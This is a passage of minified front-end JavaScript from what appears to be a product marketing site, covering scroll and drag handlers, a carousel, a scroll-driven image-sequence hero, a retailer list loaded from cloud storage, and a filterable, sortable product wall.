i=this.mousePos.x-t.pageX;this.lerp?(this.lerpSpeed=this.originalLerpSpeed,this.targetX+=i):this.scrollEl.scrollLeft+=i,this.mousePos.x=t.pageX,e>=0&&this.enablePointerEvents(!1)}else this.enablePointerEvents(!0)};this.mouseMoveListener=()=>{this.scrollEl.removeEventListener("mousemove",t)},this.scrollEl.addEventListener("mousemove",t),this.mouseUpListener=null;let e=t=>{this.mousePos.down=!1,this.enablePointerEvents(!0)};this.mouseUpListener=()=>{this.scrollEl.removeEventListener("mouseup",e)},this.scrollEl.addEventListener("mouseup",e),this.mouseOutListener=null;let i=t=>{(t.target||t.srcElement)===this.scrollEl&&e()};this.mouseOutListener=()=>{this.scrollEl.removeEventListener("mouseleave",i)},this.scrollEl.addEventListener("mouseleave",i,!0),this.mouseDownListener=null;let r=t=>{window.setTimeout((()=>{this.mousePos={x:t.pageX,down:!0,start:t.pageX}}))};this.mouseUpListener=()=>{this.scrollEl.removeEventListener("mousedown",r)},this.scrollEl.addEventListener("mousedown",r);let n=this.scrollEl.querySelector(".ps__thumb-x");n&&n.setAttribute("aria-hidden","true");let s=this.scrollEl.querySelector(".ps__rail-x");s&&s.setAttribute("aria-hidden","true")}enablePointerEvents(t){Array.prototype.slice.call(this.scrollEl.children).forEach((e=>{e.style.pointerEvents=t?"":"none"}))}isMobile(){return window.innerWidth<=rt.TABLET}createScrollbar(){if(this.perfectScrollbar&&this.perfectScrollbar.destroy(),this.mobileOnly&&!this.isMobile())return;this.isMobile()?this.raf.stop():this.lerp&&this.raf.start(),this.perfectScrollbar=new tT(this.scrollEl,{maxScrollbarLength:.25*window.innerWidth,wheelPropagation:!0,xMargin:50}),this.perfectScrollbar.update(),this.psScrollXDebouncer=null;let t=t=>{window.clearTimeout(this.psScrollXDebouncer),this.psScrollXDebouncer=window.setTimeout((()=>{let e="ps-scroll-right"==t.type?"scroll-right":"scroll-left",i=Tt.getClosestMqnFrame(this.el),r=i.getAttribute("mqn-autotrack-action"),n=(i.getAttribute("mqn-autotrack-page-type"),i.getAttribute("mqn-autotrack-product")),s=i.getAttribute("mqn-autotrack-partial-type"),o={event:"module click",eventCategory:"module click",eventAction:r,eventLabel:e,pageName:window.location.pathname,product:n,moduleName:r,moduleType:s,nonInteraction:"0"};rT.default.trackDataLayer(o)}),300)},e=t=>{this.lerp?("mousewheel"==t.detail.type||"touch"==t.detail.type?this.lerpSpeed=1:this.lerpSpeed=this.originalLerpSpeed,this.targetX=t.detail.x):this.scrollEl.scrollLeft=t.detail.x};this.scrollEl.addEventListener("ps-update-position",e),this.psScrollXDisposer=()=>{this.scrollEl.removeEventListener("ps-scroll-right",t),this.scrollEl.removeEventListener("ps-scroll-left",t),this.scrollEl.removeEventListener("ps-update-position",e)},this.scrollEl.addEventListener("ps-scroll-right",t),this.scrollEl.addEventListener("ps-scroll-left",t),[...Array.from(this.scrollEl.querySelectorAll(".ps__thumb-x")),...Array.from(this.scrollEl.querySelectorAll(".ps__thumb-y"))].forEach((t=>{t.setAttribute("aria-hidden","true"),t.removeAttribute("tabindex")}))}refresh(){this.perfectScrollbar&&this.perfectScrollbar.update()}dispose(){this.raf.dispose(),this.windowResizeListener&&this.windowResizeListener(),this.perfectScrollbar&&this.perfectScrollbar.destroy(),this.windowResizeListener&&this.windowResizeListener(),this.scrollListener&&this.scrollListener(),this.mouseMoveListener&&this.mouseMoveListener(),this.mouseUpListener&&this.mouseUpListener(),this.mouseOutListener&&this.mouseOutListener(),this.mouseDownListener&&this.mouseDownListener(),this.perfectScrollbar&&this.perfectScrollbar.destroy(),this.psScrollXDisposer&&this.psScrollXDisposer()}},sT=nT,oT=class{static get $inject(){return["$rootScope","$element","$scope","$compile"]}constructor(t,e,i,r){this.el=e[0],this.$scope=i,this.started=!1,this.previousIndex=null,this.index=0,this.timer=0,this.autoplay=!0}init(t){this.count=+t.count,this.slideCount=+t.count-1,this.speed=t.speed||5e3,this.loop=t.loop||!1,t.forceStart&&this.start(),Et.elementInViewWatcherFirstChangeOnly(this.el,{threshold:.3},((t,e,i)=>{e.isIntersecting&&(this.started||(this.start(),i()))}))}start(){this.started||(this.started=!0,this.timer=window.setInterval((()=>{this.goToNextSlide()}),this.speed))}stop(){window.clearInterval(this.timer),this.autoplay=!1}goToNextSlide(){this.goToIndex(this.index+1)}goToIndex(t){window.setTimeout((()=>{this.previousIndex=this.index,this.index=t,!this.loop&&this.index==this.slideCount&&this.stop(),this.index>this.slideCount&&(this.index=0),[...this.el.querySelectorAll("video")].forEach((t=>{t.currentTime=0,t.play()})),this.$scope.$apply()}))}dispose_(){}},aT=oT,Is=ye(gt()),lT=ye(Ba()),IN=.4,PN=0,cT=47,ON=10,RN=cT,ol=47,MN=Is.is.supportingWebp(),$N=new Ae(PN/ol,cT/ol),LN=new si(.45,0,.55,1),DN=new Ae(0,5/ol),kN=new Ae(ON/ol,RN/ol),FN=new si(.45,0,.55,1),Vo={WEBP:te.mqnCssName("mqn2-stretto-hero--supports-webp"),DEAD_SCROLL:te.mqnCssName("mqn2-stretto-hero__dead-scroll"),SEQUENCE_SPACER:te.mqnCssName("mqn2-stretto-hero__sequence-spacer"),WIPE_SPACER:te.mqnCssName("mqn2-stretto-hero__wipe-spacer"),SEQUENCE:te.mqnCssName("mqn2-stretto-hero__sequence"),STICKY_PARENT:te.mqnCssName("mqn2-stretto-hero__sticky-parent")},Jp=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.element_=t[0],this.disposed=!1,this.rl_=de.getDestroyableInstance(),this.sequenceSpacer_=this.element_.querySelector(`.${Vo.SEQUENCE_SPACER}`),this.wipeSpacer_=this.element_.querySelector(`.${Vo.WIPE_SPACER}`),this.deadScroll_=this.element_.querySelector(`.${Vo.DEAD_SCROLL}`),this.stickyParentElement_=this.element_.querySelector(`.${Vo.STICKY_PARENT}`),this.sequenceElement_=this.element_.querySelector(`.${Vo.SEQUENCE}`),this.targetProgress_=null,this.lastSequenceWidth_=null,this.lastDistance_=null,this.lottieProgress_=null,this.sequenceProgress_=null,this.wipeProgress_=null,this.init_(),e.$on("$destroy",(()=>this.dispose()))}init_(){this.rafProgress=new Is.RafProgress((t=>this.onProgressUpdate(t))),MN&&this.rl_.mutate((()=>Fi(this.element_,Vo.WEBP))),this.initSequence_(),this.rafProgress.setCurrentProgress(0)}resizeLoop_(){this.rl_.measure((()=>{if(this.disposed)return;this.rl_.cleanup((()=>this.resizeLoop_()));let t=this.sequenceElement_.offsetWidth;this.lastSequenceWidth_!==t&&(this.lastSequenceWidth_=t,this.sequenceCanvas.resize())}))}easeTo_(t){t!==this.targetProgress_&&(this.targetProgress_=t,this.rafProgress.easeTo(t,IN,Is.EASE.linear))}initSequence_(){this.sequenceSrcs_=Is.is.safari()?JSON.parse(this.element_.getAttribute("data-sequence-safari")):JSON.parse(this.element_.getAttribute("data-sequence")),this.sequenceCanvas=new lT.WebGlImageSequence(this.sequenceElement_,[{images:this.sequenceSrcs_}],{bottom:0}),this.sequenceCanvas.load().then((()=>{this.element_.classList.add("loaded"),this.sequenceCanvas.renderByProgress(this.rafProgress.currentProgress),this.resizeLoop_(),this.onAssetLoadComplete()}))}onAssetLoadComplete(){this.rl_.measure((()=>{this.disposed||(this.sequenceCanvas.renderByProgress(0),this.loop_())}))}getViewportHeight_(){return window.innerHeight-Sn()-Bc()}getScrollRange_(){let t=this.getViewportHeight_()+this.deadScroll_.offsetHeight-this.stickyParentElement_.offsetHeight;return new Ae(Sn(),t)}loop_(){this.rl_.measure((()=>{if(this.disposed)return;this.rl_.cleanup((()=>this.loop_()));let t=Ir(this.stickyParentElement_);if(this.lastDistance_===t)return;this.lastDistance_=t;let e=this.getScrollRange_().getValueAsPercent(t);this.easeTo_(e)}))}getSequenceShareOfProgress_(){let t=this.sequenceSpacer_.offsetHeight;return t/(t+(this.wipeSpacer_?this.wipeSpacer_.offsetHeight:0))}onProgressUpdate(t){let e=this.sequenceSpacer_.offsetHeight,i=e+(this.wipeSpacer_?this.wipeSpacer_.offsetHeight:0),r=new Ae(0,1),n=new Ae(0,e/i),s=new Ae(e/i,1),o=r.getValueAsPercent(t),a=n.getValueAsPercent(t),l=s.getValueAsPercent(t);this.updateLottie_(o),this.updateSequence_(a),this.wipeSpacer_&&this.updateWipe_(l)}updateLottie_(t){t!==this.lottieProgress_&&!isNaN(t)&&(this.lottieProgress_=t,Ie(this.element_,"--lottie-progress",`${t}`))}updateSequence_(t){if(t===this.sequenceProgress_||isNaN(t))return;this.sequenceProgress_=t,this.sequenceCanvas.renderByProgress(t);let e=$N.getValueAsPercent(t),i=LN.getAdjustedPercent(e),r=kN.getValueAsPercent(t),n=FN.getAdjustedPercent(r),s=DN.getValueAsPercent(t);this.rl_.mutate((()=>{this.disposed||(Ie(this.element_,"--eased-scrubbed-progress",`${i}`),Ie(this.element_,"--case-progress",`${n}`),Ie(this.element_,"--chapter-opacity",`${s}`))}))}updateWipe_(t){t!==this.wipeProgress_&&!isNaN(t)&&(this.wipeProgress_=t,Ie(this.element_,"--wipe-progress",`${t}`),Ie(this.element_,"--lottie-complete",""+(t>0?1:0)))}dispose(){this.disposed=!0,this.rafProgress.dispose(),this.sequenceCanvas.dispose()}},uT=Jp,NN="https://storage.googleapis.com/mannequin/data/retailers/",hT=class{static get $inject(){return["$element","$scope","$window","$timeout","$http","$rootScope"]}constructor(t,e,i,r,n,s){this.element=t[0],this.$element=t,this.started=!1,this.$scope=e,this.$window=window,this.$timeout=r,this.$http=n,this.$rootScope=s,this.ready=!1,this.drawerOpen=!1,this.locale=null,this.productName=null,this.featured=null,this.extra=null,this.setVisible(!1),this.inviewWatcher=Et.elementInViewWatcherFirstChangeOnly(this.element,{threshold:0,rootMargin:"0px 0px 300% 0px"},((t,e,i)=>{e.isIntersecting&&(this.isReady(),i())}))}setOpen(t){this.drawerOpen=t}toggleDrawer(){this.drawerOpen=!this.drawerOpen}init(t,e,i){this.productName=e,this.locale=t,i&&this.setOpen(!0)}isReady(){let t=(new Date).getTime(),e=NN+this.productName+".json?"+t;this.$http({method:"GET",url:e}).then((t=>{let e=t.data,i=e[this.locale];t&&e&&i?(this.featured=i.filter((t=>t.featured)),this.extra=i.filter((t=>!t.featured)),this.ready=!0,this.setVisible(!0)):this.setVisible(!1)}),(()=>{console.log("MQN: Failed to retreive 3PRs."),this.setVisible(!1)}))}setVisible(t){let e=this.element,i=te.mqnCssName("mqn2-frame");for(;e;)e.classList.contains(i)?(e.style.height=t?"":"1px",e.style.overflow=t?"":"hidden",e=null,e=null):e=e.parentNode}},fT=hT,dT=class{static get $inject(){return["$rootScope","$element","$scope","$compile"]}constructor(t,e,i,r){this.currentVariant=0}handleVariantClick(t){this.currentVariant=t}},pT=dT,VN=10;function qN(){var t=document.querySelector(".navbar");return t?t.offsetHeight+VN:0}var mT=qN,gT={SORT_MENU:te.mqnCssName("mqn2-product-wall__header__sort__selection"),SORT_TOGGLE_BUTTON:te.mqnCssName("mqn2-product-wall__header__sort-group")},vT=class{static get $inject(){return["$rootScope","$element","$scope","$timeout","$sce","$http","$sanitize"]}constructor(t,e,i,r,n,s,o){this.$scope=i,this.$rootScope=t,this.el=e[0],this.$element=e,this.$timeout=r,this.$sce=n,this.$http=s,this.$sanitize=o,this.locale="en_US",this.productType="accessories",this.loading=!0,this.products_=[],this.env="prod",this.hasDocIdPricing_=!1,this.validProductFilters=new qo,this.validProductFiltersOfResults=new qo,this.filters=new qo,this.filterGroups=[],this.filteredProducts=[],this.filteredProductsCurrentPage=[],this.productsByFilterGroup=[],this.filterGroupsMap_={},this.filterValueToGroupNameMap_={},this.allFilterGroupNames={},this.nonFilterUrlParams_="",this.sortPanelOpen=!1,this.sortDisplayLabel="",this.sortType="",rt.IS_DESKTOP_OR_TABLET()?(this.numCols=3,this.numRows=6):(this.numCols=2,this.numRows=7),this.numProductsPerPage=this.numCols*this.numRows,this.page=0,this.numPages=1,this.mobileToggleState=null,this.mainElementStyle={},this.termsModalActive=!1,this.termsTitle="",this.termsBody="",this.filtersWrapEl_=this.el.querySelector("."+te.mqnCssName("mqn2-product-wall__filters-wrap")),this.filtersEl_=this.el.querySelector("."+te.mqnCssName("mqn2-product-wall__filters")),this.filtersContentEl_=this.el.querySelector("."+te.mqnCssName("mqn2-filters__controls")+"."+te.mqnCssName("mqn2-desktop-tablet-only")),this.scrollListener_=null,this.fixedFilters=!1,this.navbarOffset=0,this.lastScrollPos_=0,this.scrollDirection_=null,this.filtersBarStyles={},this.filtersState="top",this.resizeListener_=null,this.updatingImages_=!1,i.$on("$destroy",(()=>{this.dispose_()}))}init(t,e){this.sortType=t,this.sortDisplayLabel=e;let i=document.querySelector(".footer-container");i&&(i.style.position="relative",i.style.zIndex=1)}toggleMobileMenu(t){this.mobileToggleState=this.mobileToggleState==t?null:t}toggleSortPanel(){this.sortPanelOpen=!this.sortPanelOpen,this.sortPanelOpen&&window.setTimeout((()=>{let t=this.el.querySelector(`.${gT.SORT_MENU}`).firstElementChild;t&&t.focus()}),100)}applyMobileFilters(){this.mobileToggleState=null,this.smoothScrollTop_()}setNumCols(t){this.numCols=2==t?2:3,this.numProductsPerPage=this.numCols*this.numRows,this.update_(!0)}updateImageWidths_(){this.products_.forEach((t=>{t.images.forEach((t=>{let e=t.url;if(yo(e)){let t=window.innerWidth<768?2:3,i=window.innerWidth/t,r=1+.06*window.devicePixelRatio,n=Math.ceil(i*r*window.devicePixelRatio);e=e.split("=")[0]+"=w"+n}t.url=e}))})),this.updatingImages_=!1,this.$scope.$$phase||this.$scope.$apply()}fetchData(t){let e=Math.floor(new Date/1e3),i=this.locale.toLowerCase(),r=t.replace("{locale}",i)+"?c="+e;this.$http.get(r).then((t=>{this.setData(t.data)}))}getTimestamp_(){if("prod"!==this.env){let t=new URL(window.location.href).searchParams.get("fcd");if(t&&16==t.length)return this.parseFcdString_(t)}let t=new Date;return Math.floor(t.getTime()/1e3)}parseFcdString_(t){let e=t.split("T"),i=e[0],r=e[1],n=new Date(t).toLocaleString("en",{timeZone:"America/Los_Angeles",timeStyle:"long"}).split(" ").slice(-1)[0];return Math.floor(Date.parse(`${i} ${r} ${n}`)/1e3)}setData(t){this.el.classList.add("ready");let e=this.getTimestamp_();this.products_=t.products.filter((t=>!(!(t.locales||[]).includes(this.locale)||t.start_ts&&t.start_ts>e||t.end_ts&&e>t.end_ts))),this.products_.forEach((t=>{t.eyebrow&&(t.eyebrow=this.$sanitize(t.eyebrow),t.eyebrow.includes("Black Friday")&&(t.eyebrowClass="black-friday")),t.doc_id&&(this.hasDocIdPricing_=!0);let e=t.images||[],i={};t.images=e.filter((t=>{let e=t.locales||[];return 0==e.length||e.includes(this.locale)})).filter((t=>{if(!t.color)return!0;let e=t.color.color_name;return!i[e]&&(i[e]=!0,!0)})),t.images.length>0&&(t.images[0].active=!0),(t.filter_matches||[]).forEach((t=>{this.validProductFilters.enable(t.filter_category,t.filter_value);let e=t.filter_group_name||t.filter_category;this.allFilterGroupNames[e]=!0,this.setFilterGroupNameForValue_(t.filter_category,t.filter_value,e)}))})),this.filterGroups=t.filter_groups,this.filterGroups.forEach((t=>{rt.IS_DESKTOP_OR_TABLET()?(t.collapsed=!1,("accessories"==this.productType&&"Compatibility"!=t.name||"offers"==this.productType)&&(t.collapsed=!0)):t.collapsed=!0,"accessories"==this.productType&&"Compatibility"==t.name&&(t.subfilters||[]).forEach((t=>{t.filters=t.filters.filter((t=>!(t.start_ts&&t.start_ts>e||t.end_ts&&e>t.end_ts)))})),t.id=t.name.toLowerCase().replace(/ /g,""),this.filterGroupsMap_[t.name]=t})),this.updateImageWidths_(),this.resizeListener_||(this.resizeListener_=()=>{this.updatingImages_||(this.updatingImages_=!0,this.$timeout((()=>this.updateImageWidths_()),1e3))},window.addEventListener("resize",this.resizeListener_,{passive:!0})),this.$timeout((()=>{this.scrollListener_||(this.scrollListener_=()=>{this.onScroll_()},window.addEventListener("scroll",this.scrollListener_,{passive:!0}),this.onScroll_())}),1e3),this.initFiltersFromUrlParams_(),this.$timeout((()=>{this.jumpToSectionFromParams_()}),500),this.updateFilters_(!1)}getCount(){return this.products_.length}onScroll_(){let t=mT();this.navbarOffset=t;let e=this.getScrollPos_(),i=e-this.lastScrollPos_;if(this.scrollDirection_=i<0?"up":"down",this.lastScrollPos_=e,rt.IS_DESKTOP_OR_TABLET()){let i=this.el.querySelector("."+te.mqnCssName("mqn2-product-wall__content"));if(i&&i.offsetHeight<=this.filtersEl_.scrollHeight)this.filtersState="top",this.filtersEl_.scrollTop=0;else{let i=this.getTopRelativeTo_(this.filtersWrapEl_,document.body)+this.filtersWrapEl_.offsetHeight,r=e+this.getViewportHeight_();this.filtersWrapEl_.getBoundingClientRect().top>t?this.filtersState="top":this.filtersState=r>=i?"bottom":"fixed"}}else this.filtersState="top";"fixed"==this.filtersState?(this.filtersBarStyles["margin-top"]=`${t}px`,this.filtersBarStyles.height=`calc(100vh - ${t}px)`,"down"==this.scrollDirection_&&this.filtersEl_.offsetHeight+this.filtersEl_.scrollTop<this.filtersContentEl_.offsetHeight+48&&(this.filtersEl_.scrollTop+=i),"up"==this.scrollDirection_&&this.filtersEl_.scrollTop>0&&(this.filtersEl_.scrollTop+=i)):this.filtersBarStyles={},this.$scope.$$phase||this.$scope.$apply()}getTopRelativeTo_(t,e){return zr(t,e)}getScrollPos_(){return void 0!==window.pageYOffset?window.pageYOffset:document.documentElement.scrollTop}getViewportHeight_(){return Math.max(document.documentElement.clientHeight,window.innerHeight||0)}hasAnyFilters(){return this.filterGroups.some((t=>this.shouldShowFilterGroup(t)))}shouldShowFilterGroup(t){return"accessories"==this.productType?this.getActiveFilterCount(t.name)>1:this.allFilterGroupNames[t.name]}getActiveFilterCount(t){return this.validProductFilters.getValuesForCategory(t).length}getFilterGroupNameForValue_(t,e){let i=t+"|"+e;return this.filterValueToGroupNameMap_[i]}setFilterGroupNameForValue_(t,e,i){let r=t+"|"+e;this.filterValueToGroupNameMap_[r]=i}jumpToSectionFromParams_(){if(!window.URLSearchParams||!location.search)return;let t=new URLSearchParams(location.search.slice(1)).get("jump"),e=document.getElementById(t);if(t&&e){let t=60;window.scrollTo({top:window.scrollY+e.getBoundingClientRect().top-t,behavior:"smooth"})}}initFiltersFromUrlParams_(){if(!window.URLSearchParams||!location.search)return;let t=new URLSearchParams(location.search.slice(1)),e=new URLSearchParams(location.search.slice(1)),i=null,r=null;this.filterGroups.forEach((n=>{let s=n.name;"offers"==this.productType&&(s="Products"),"Compatibility"==s&&(i=n);let o=n.url_param;!o||(e.delete(o),t.getAll(o).forEach((t=>{this.validProductFilters.isEnabled(s,t)&&(this.filters.enable(s,t),n.collapsed=!1,"Colors"==s&&(r=t))})))})),i&&(t.getAll("compatibilityCategory").forEach((t=>{i.subfilters.forEach((e=>{e.name==t&&e.filters.forEach((t=>{this.validProductFilters.isEnabled(t.filter_category,t.filter_value)&&this.filters.enable(t.filter_category,t.filter_value)}))}))})),e.delete("compatibilityCategory")),r&&this.updateProductColors(r),this.nonFilterUrlParams_=e.toString(),t.get("page")&&window.setTimeout((()=>{this.goToPage(t.get("page")-1)}))}hasActiveFilters(){return this.filters.getCount()>0}isFilterEnabled(t,e){return this.filters.isEnabled(t,e)}isFilterEnabledForCategory(t){return this.filters.isCategoryEnabled(t)}isSubfilterActive(t){return t.filters.some((t=>this.validProductFilters.isEnabled(t.filter_category,t.filter_value)))}isSubfilterEnabled(t){return t.filters.some((t=>this.filters.isEnabled(t.filter_category,t.filter_value)))}resetFiltersForSubcategory(t){t.filters.forEach((t=>{this.filters.disable(t.filter_category,t.filter_value)})),this.updateFilters_()}toggleFilter(t,e){let i=this.filters.toggle(t,e);"Colors"==t&&i&&this.updateProductColors(e);let r=this.updateFilters_();rt.IS_DESKTOP_OR_TABLET()&&r.then((()=>this.smoothScrollTop_()))}resetFilters(){this.filters.reset();let t=this.updateFilters_();rt.IS_DESKTOP_OR_TABLET()&&t.then((()=>this.smoothScrollTop_()))}resetFiltersForCategory(t){this.filters.resetCategory(t);let e=this.updateFilters_();rt.IS_DESKTOP_OR_TABLET()&&e.then((()=>this.smoothScrollTop_()))}setSort(t,e){this.mobileToggleState=null,this.page=0,this.sortType=t,this.sortDisplayLabel=e,this.sortPanelOpen=!1,this.update_().then((()=>{if(this.smoothScrollTop_(),rt.IS_DESKTOP_OR_TABLET()){let t=this.el.querySelector(`.${gT.SORT_TOGGLE_BUTTON}`);t&&t.focus()}}))}goToPage(t){this.page=t,this.page<0&&(this.page=0),this.page>this.numPages-1&&(this.page=this.numPages-1),this.update_().then((()=>this.smoothScrollTop_())),this.setUrlParams_()}nextPage(){this.goToPage(this.page+1)}prevPage(){this.goToPage(this.page-1)}range(t){let e=[];for(let i=0;i<t;i++)e.push(i);return e}setProductActiveImage(t,e){t.images.forEach(((t,i)=>{t.active=i==e}))}getProductActiveImage(t){let e=this.getProductActiveImageIndex(t);return t.images[e]}getProductActiveImageIndex(t){for(let e=0;e<t.images.length;e++)if(t.images[e].active)return e;return 0}updateProductColors(t){this.products_.forEach((e=>{for(let i=0;i<e.images.length;i++){let r=e.images[i];if(r.color&&r.color.color_name===t)return void this.setProductActiveImage(e,i)}}))}hasMultipleProductImages(t){return t.images&&t.images.length>1}nextProductImage(t){let e=(this.getProductActiveImageIndex(t)+1)%t.images.length;this.setProductActiveImage(t,e)}prevProductImage(t){let e=(this.getProductActiveImageIndex(t)-1)%t.images.length;e<0&&(e+=t.images.length),this.setProductActiveImage(t,e)}updateFilters_(t=!0){return this.page=0,this.filteredProducts=this.products_.filter((t=>this.shouldShowProduct_(t))),this.numPages=Math.ceil(this.filteredProducts.length/this.numProductsPerPage),this.validProductFiltersOfResults.reset(),this.filteredProducts.forEach((t=>{(t.filter_matches||[]).forEach((t=>{this.validProductFiltersOfResults.enable(t.filter_category,t.filter_value)}))})),t&&this.setUrlParams_(),this.update_()}update_(t=!1){return new Promise(((e,i)=>{let r=()=>{this.filteredProducts.sort(this.getSortFunc_(this.sortType)),"offers"==this.productType&&this.groupProductsByFilterGroup_();let t=this.page*this.numProductsPerPage;this.filteredProductsCurrentPage=this.filteredProducts.slice(t,t+this.numProductsPerPage),this.loading=!1,this.$scope.$$phase||this.$scope.$apply(),this.hasDocIdPricing_?this.$timeout((()=>{let t=new Event("populatePrices");document.dispatchEvent(t),e()}),0):e()};t?r():(this.loading=!0,this.$timeout(r,300))}))}shouldDisableFilter(t,e){if("accessories"!=this.productType||0==this.filters.getCount()||this.filters.isEnabled(t,e))return!1;let i=this.filters.copy();return i.resetCategory(t),0!=i.getCount()&&(i.enable(t,e),!this.matchesAnyProductWithFilters_(i))}matchesAnyProductWithFilters_(t){return this.products_.some((e=>this.shouldShowProduct_(e,t=t)))}groupProductsByFilterGroup_(){this.productsByFilterGroup=[],this.filters.getCount()>0?this.filters.getValues().forEach((t=>{t.filterValues.forEach((t=>{this.productsByFilterGroup.push({title:t,products:this.filteredProducts.filter((e=>(e.filter_matches||[]).some((e=>e.filter_value==t))))})}))})):this.filterGroups.forEach((t=>{!this.allFilterGroupNames[t.name]||this.productsByFilterGroup.push({title:t.display_name||t.name,id:t.id,products:this.filteredProducts.filter((e=>this.isProductInFilterGroup_(e,t)))})}))}isProductInFilterGroup_(t,e){let i={};return e.filters.forEach((t=>{let e=i[t.filter_category];e||(e={},i[t.filter_category]=e),e[t.filter_value]=!0})),(t.filter_matches||[]).some((t=>i[t.filter_category]&&i[t.filter_category][t.filter_value]))}smoothScrollTop_(){let t=this.el.querySelector("."+te.mqnCssName("mqn2-product-wall__main"));if(!this.isTopOfElementVisible_(t)){let t=this.el.getBoundingClientRect().top+(window.pageYOffset||document.documentElement.scrollTop)+this.navbarOffset;window.scroll({top:t,left:0,behavior:"smooth"})}this.onScroll_()}isTopOfElementVisible_(t){let e=t.getBoundingClientRect().top,i=window.innerHeight||document.documentElement.clientHeight;return e>=0&&e<=i}shouldShowProduct_(t,e=null){return e||(e=this.filters),0==e.getCount()||e.getValues().every((e=>{let i=e.filterCategory,r=e.filterValues;return(t.filter_matches||[]).some((t=>t.filter_category==i&&r.includes(t.filter_value)))}))}getSortFunc_(t){switch(t){case"newest":return bT;case"newest_offers":return WN;case"price_offers_low":return wT;case"price_offers_high":return UN;case"featured":default:return BN}}setUrlParams_(){if(window.history.replaceState){let t=this.getUrlParams_(),e=location.pathname;t&&(e+="?"+t),window.history.replaceState({},document.title,e)}}getUrlParams_(){if(!window.URLSearchParams)return this.nonFilterUrlParams_;let t=new URLSearchParams(this.nonFilterUrlParams_);return this.filters.getCount()>0&&this.filters.getValues().forEach((e=>{e.filterValues.forEach((i=>{let r=this.getFilterGroupNameForValue_(e.filterCategory,i),n=this.filterGroupsMap_[r];if(!n)return;let s=n.url_param;!s||t.append(s,i)}))})),this.page>0?t.set("page",this.page+1):t.delete("page"),t.toString()}showTermsModal(t,e){this.termsModalActive=!0,this.termsTitle=t,this.termsBody=this.$sanitize(e)}closeTermsModal(){this.termsModalActive=!1}dispose_(){this.resizeListener_&&(window.removeEventListener("resize",this.resizeListener_,{passive:!0}),this.resizeListener_=null),this.scrollListener_&&(window.removeEventListener("scroll",this.scrollListener_,{passive:!0}),this.scrollListener_=null)}},yT=vT,qo=class{constructor(){this.filters={},this.count_=0}isEnabled(t,e){let i=this.filters[t];return!!i&&!!i[e]}isCategoryEnabled(t){return 0!==this.count_&&!!this.filters[t]}toggle(t,e){return this.isEnabled(t,e)?(this.disable_(t,e),!1):(this.enable_(t,e),!0)}enable(t,e){this.isEnabled(t,e)||this.enable_(t,e)}enable_(t,e){let i=this.filters[t];i||(i={},this.filters[t]=i),i[e]=!0,this.count_+=1}disable(t,e){!this.isEnabled(t,e)||this.disable_(t,e)}disable_(t,e){let i=this.filters[t];!i||!i[e]||(delete i[e],0==Object.keys(i).length&&delete this.filters[t],this.count_-=1)}getValuesForCategory(t){let e=this.filters[t];return e?Object.keys(e):[]}getValues(){return Object.keys(this.filters).map((t=>({filterCategory:t,filterValues:Object.keys(this.filters[t])})))}copy(){let t=new qo;return this.getValues().forEach((e=>{e.filterValues.forEach((i=>{t.enable(e.filterCategory,i)}))})),t}reset(){this.filters={},this.count_=0}resetCategory(t){let e=this.filters[t];!e||(this.count_-=Object.keys(e).length,delete this.filters[t])}getCount(){return this.count_}};function _T(t,e){return t.order-e.order}function BN(t,e){return t.featured&&!e.featured?-1:!t.featured&&e.featured?1:_T(t,e)}function bT(t,e){return t.start_date>e.start_date?-1:t.start_date<e.start_date?1:_T(t,e)}function WN(t,e){return bT(t,e)}function wT(t,e){return ET(t.price_sale)-ET(e.price_sale)}function ET(t){let e=t.replace(/[^0-9.-]+/g,"");return e?window.parseInt(e):0}function UN(t,e){return-1*wT(t,e)}var em=ye(Jt()),or=ye(gt()),ST=ye(Nt()),AT=ye(Ki()),CT=ye(Gn()),TT=te.mqnCssName("mqn2-footsteps__step--active"),tm=te.mqnCssName("mqn2-footsteps--inview"),HN=te.mqnCssName("mqn2-footsteps__step__asset__bubbles"),GN=te.mqnCssName("mqn2-query-bubble__quote"),rm=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.el=e[0],this.ev=em.elementVisibility.inview(this.el,{rootMargin:"500px"},((t,e)=>{this.isMobile()&&this.onInviewMobile(this.ev.state().inview)})),this.evDesktop=em.elementVisibility.inview(this.el,null,((t,e)=>{this.isMobile()||this.onInviewDesktop(this.evDesktop.state().inview)})),this.cssInterpolater=new AT.CssVarInterpolate(this.el),this.rafProgress=new or.RafProgress((t=>{this.onEasedScroll(t)})),this.rafProgress.setPrecision(5),this.queryBubbles=this.el.getElementsByClassName(HN),this.domWatcher=new ST.DomWatcher,this.domWatcher.add({element:window,on:"scroll",eventOptions:{passive:!0},runWhen:()=>window.innerWidth>=768&&this.ev.state().inview,id:"calculateActiveStep",callback:or.func.throttle((()=>{this.calculateActiveStep()}),48)}),this.domWatcher.add({element:window,on:"scroll",callback:or.func.throttle((()=>{this.onScroll()}),24),runWhen:()=>this.ev.state().ready&&this.ev.state().inview,eventOptions:{passive:!0},id:"scroll"}),this.domWatcher.add({element:window,on:"smartResize",eventOptions:{passive:!0},id:"resize",callback:or.func.debounce((()=>{this.onResize()}),100)}),this.innerElement=this.el.querySelector("[inner]"),this.headerElement=this.el.querySelector("[header]"),this.headerTitleElement=this.el.querySelector("[title]"),this.toutContentElements=Array.from(this.el.querySelectorAll("[tout-contents]")),this.stepElements=Array.from(this.el.querySelectorAll("[steps]")),this.stepInnerElements=Array.from(this.el.querySelectorAll("[steps-inner]")),this.activeStepElement=null,this.stepsContainerElement=this.el.querySelector("[steps-container]"),this.progress=0,this.innerHeight=null,this.ev.readyPromise.then((()=>{this.onResize(),this.domWatcher.run("scroll"),this.domWatcher.run("calculateActiveStep")})),this.updateActiveStep_=or.func.runOnceOnChange(this.updateActiveStep_.bind(this)),this.onInviewMobile=or.func.runOnceOnChange(this.onInviewMobile.bind(this)),i.$on("$destroy",(()=>this.dispose_()))}onInviewDesktop(t){t?or.dom.unflushVideos(this.el,!0):(this.stepElements.forEach(((t,e)=>{or.dom.resetAllVideosInElement(t,!0),or.dom.pauseAllVideosInElement(t,!0)})),or.dom.flushVideos(this.el,"mqn-lazyimage-src"),this.updateActiveStep_(this.stepElements.length))}onInviewMobile(t){t?this.activeStepElement&&or.dom.playAllVideosInElement(this.activeStepElement):this.stepElements.forEach(((t,e)=>{or.dom.pauseAllVideosInElement(t,!0)}))}isMobile(){return window.innerWidth<768}applyQueryBubbleOffsets(){[...this.queryBubbles].forEach((t=>{let 